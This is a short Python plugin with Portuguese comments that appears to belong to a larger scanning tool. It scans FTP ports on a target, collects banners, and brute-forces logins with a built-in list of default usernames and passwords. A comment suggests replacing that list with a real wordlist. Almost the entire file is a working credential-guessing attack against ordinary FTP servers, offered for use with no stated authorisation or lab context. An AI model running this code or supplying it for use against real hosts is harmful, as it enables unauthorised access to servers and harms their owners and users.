# plugins/ftp_brute.py
def run(target, results):
    """
    Scanner e brute-force básico para FTP.
    Lista portas abertas, banners e tenta credenciais comuns.
    """
    import socket
    import ftplib
    from time import sleep

    ftp_ports = [21, 2121, 8021]
    open_ports = []
    creds_found = []

    # 1. Scan de portas FTP
    for port in ftp_ports:
        s = socket.socket()
        s.settimeout(3)
        try:
            s.connect((target, port))
            banner = s.recv(1024).decode(errors="ignore")
            open_ports.append({'port': port, 'banner': banner})
        except Exception:
            pass
        s.close()

    results['ftp_ports'] = open_ports

    # 2. Brute-force (mini wordlist, troque por real se quiser)
    users = ["ftp", "admin", "user", "anonymous"]
    passwords = ["ftp", "123456", "admin", "anonymous@", "password"]

    for port in [p['port'] for p in open_ports]:
        for user in users:
            for passwd in passwords:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(target, port, timeout=3)
                    ftp.login(user, passwd)
                    creds_found.append({'port': port, 'user': user, 'pass': passwd})
                    ftp.quit()
                except Exception:
                    continue

    results['ftp_brute'] = creds_found if creds_found else "Nenhuma credencial encontrada"
